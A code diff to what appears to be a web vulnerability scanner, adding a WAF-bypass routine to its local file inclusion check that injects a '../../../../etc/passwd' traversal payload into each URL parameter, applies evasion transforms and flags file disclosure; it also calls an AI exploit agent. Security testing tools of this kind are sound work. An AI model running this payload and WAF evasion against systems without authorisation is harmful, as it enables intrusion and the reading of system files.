@@ -247,6 +247,14 @@ def scan_lfi(url, forms, delay, options=None, threads=None):
 
     vulns.extend(run_concurrent_tasks(tasks, max_workers=threads))
 
+    # ── 3-tier WAF bypass chain (auto-tamper / AI evolution / protocol evasion) ──
+    # Conservative fallback before delegating to ai_exploit_agent: only fires
+    # when the main scan triggered a specific-WAF fingerprint.
+    if not vulns and params:
+        bypass_finding = _run_waf_bypass_chain_for_lfi(params, parsed, delay)
+        if bypass_finding:
+            vulns.append(bypass_finding)
+
     if not vulns and params:
         try:
             from utils.ai_exploit_agent import get_exploit_agent, ExploitContext
@@ -276,6 +284,94 @@ def scan_lfi(url, forms, delay, options=None, threads=None):
             pass
 
     return vulns
+
+
+def _run_waf_bypass_chain_for_lfi(params, parsed, delay):
+    """3-tier WAF bypass over each URL param using a representative LFI
+    traversal payload. Returns the first finding or None.
+
+    Activates only when ``waf_detector.detected_waf`` is non-empty.
+    """
+    from utils.waf import waf_detector
+
+    waf_name = getattr(waf_detector, "detected_waf", "") or ""
+    if not waf_name:
+        return None
+
+    from utils.waf_evasion import apply_waf_bypass_chain
+
+    seed_payload = "../../../../etc/passwd"
+
+    log_info(f"⚡ LFI: 3-tier WAF bypass attempt against {waf_name}")
+
+    # Establish a clean baseline once so detect_lfi can subtract it. If the
+    # baseline fetch fails the chain still runs — detect_lfi degrades to its
+    # signature-only mode.
+    baseline_text = ""
+    try:
+        baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
+        baseline_resp = smart_request("get", baseline_url, delay=delay)
+        baseline_text = getattr(baseline_resp, "text", "") or ""
+    except ScanExceptions:
+        pass
+
+    for param in list(params.keys()):
+        state = {"params": params.copy()}
+
+        def request_fn(p, *, evasion_level=0):
+            test_params = state["params"]
+            test_params[param] = [p]
+            test_url = urlunparse(
+                parsed._replace(query=urlencode(test_params, doseq=True))
+            )
+            state["last_test_url"] = test_url
+            try:
+                return smart_request(
+                    "get", test_url, delay=delay, evasion_level=evasion_level
+                )
+            except ScanExceptions:
+                return None
+
+        def check_fn(response, p, source):
+            if response is None:
+                return None
+            body = getattr(response, "text", "") or ""
+            # detect_lfi returns (os_type, signature) — both None when no
+            # LFI signal is present. The tuple is truthy so we MUST unpack
+            # and test os_type before declaring a finding.
+            os_type, sig = detect_lfi(body, baseline_text=baseline_text)
+            if not os_type:
+                return None
+            test_url = state.get("last_test_url", "")
+            increment_vulnerability_count()
+            log_vuln(f"LFI via WAF bypass! [{source}]")
+            log_success(f"Param: {param} | {os_type}: {sig} | {source}")
+            return {
+                "type": "LFI_Param",
+                "param": param,
+                "payload": p,
+                "url": test_url,
+                "os": os_type,
+                "source": f"WAF Bypass Chain ({source})",
+                "waf": waf_name,
+                "evidence": str(sig)[:200],
+            }
+
+        seed_resp = request_fn(seed_payload)
+        if seed_resp is None:
+            continue
+
+        finding = apply_waf_bypass_chain(
+            payload=seed_payload,
+            blocked_response=seed_resp,
+            request_fn=request_fn,
+            check_fn=check_fn,
+            waf_name=waf_name,
+            vuln_label="LFI",
+        )
+        if finding:
+            return finding
+    return None
 
 # ── Async version ─────────────────────────────────────────────────────────
 
